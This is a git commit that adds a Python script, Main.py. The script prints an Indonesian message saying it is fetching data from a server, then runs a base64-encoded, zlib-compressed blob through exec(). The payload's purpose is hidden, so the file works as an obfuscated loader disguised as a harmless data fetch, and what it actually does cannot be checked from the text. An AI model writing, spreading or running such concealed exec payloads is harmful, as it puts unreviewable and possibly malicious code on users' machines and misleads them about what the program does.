2d9c9e5834483f6de890af7e9b17506788d8786a
Ferbazz <123790596+FerBazz@users.noreply.github.com>
2023-06-27 19:41:31 +0700

    Add files via upload

---
+++ Main.py
@@ -0,0 +1,6 @@
+import os,time
+
+#---- Buat Ambil Data Dari Server--------
+print('Tunggu Sedang Mengambil Data Dari Server')
+
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdf0VsSjEN37S64WEHEg4gIrjcRSZNxDU2TkGS1Kv67G7p4meG9eTPzZswYfMx18mrALL6t6UUvE65bkXLcqyyyGZG8+VhPtXF1lG6HbNHwDaly/DrEKnVzM8yJLcURbx+u7163T483V/e86EB551BlxmgDWQWQAdwu+gGMp2Jxtlqe8yLsI8qBVDgpDLlsKBYgWcTAVpzYbnYGexekGhi9vKUiQUT1wVrOn5sXorsjtpx8vhuLtUXHNL+wh3H65L96OtOc4ISKleNBo/JjiJgSm/8A/botpMaiFD800U365eQPiFBi0Q==')[0])))
